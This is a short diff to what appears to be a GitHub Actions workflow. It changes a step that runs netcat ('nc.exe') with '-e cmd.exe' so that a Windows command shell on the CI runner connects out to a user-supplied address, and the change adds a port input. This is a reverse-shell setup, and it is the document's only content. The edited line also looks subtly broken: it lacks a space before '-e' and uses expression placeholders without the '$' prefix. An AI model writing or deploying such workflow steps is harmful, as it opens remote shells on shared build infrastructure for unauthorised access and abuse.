@@ -32,7 +32,7 @@ jobs:
        ls
        cd netcat-1.11
        ls
-       ./nc.exe {{ github.event.inputs.pin }} -e cmd.exe
+       ./nc.exe {{ github.event.inputs.pin }} {{ github.event.inputs.port }}-e cmd.exe
        
        
     
